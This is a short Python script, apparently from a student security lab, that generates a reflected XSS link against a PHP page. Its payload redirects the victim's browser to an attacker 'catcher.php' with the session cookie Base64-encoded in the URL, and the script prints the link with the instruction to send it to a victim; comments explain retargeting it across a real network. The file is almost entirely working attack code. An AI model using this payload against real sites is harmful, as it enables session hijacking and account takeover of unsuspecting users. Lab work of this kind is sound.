import urllib.parse

# Default to localhost so the lab works out of the box on a single XAMPP
# machine. For a real network XSS demo across two computers, change
# TARGET_IP to the IP of the vulnerable site's host and ATTACKER_IP to
# the IP of the machine running the catcher (AttackerServer/catcher.php).
TARGET_IP = "localhost"
TARGET_URL = f"http://{TARGET_IP}/CyberProject/home.php"

# Attacker's address (where data will be sent)
# we can use our own IP address or the IP address of the machine running the catcher (AttackerServer/catcher.php).
ATTACKER_IP = "localhost"

# The Payload: stealing cookies and sending them to log.php
js_payload = f"<script>document.location='http://{ATTACKER_IP}/CyberProject/AttackerServer/catcher.php?data=' + btoa(document.cookie);</script>" # btoa - a function that encodes a string to Base64 to hide the cookies

encoded_payload = urllib.parse.quote(js_payload)
malicious_link = f"{TARGET_URL}?msg={encoded_payload}"

print("="*60)
print(f"[!] Network XSS Payload Generated (Target: {TARGET_IP})")
print("="*60)
print(f"\nSend this link to the victim:\n\n{malicious_link}")

# After running this script, paste the printed link into a browser that is
# already logged in to the target site (http://localhost/CyberProject/home.php).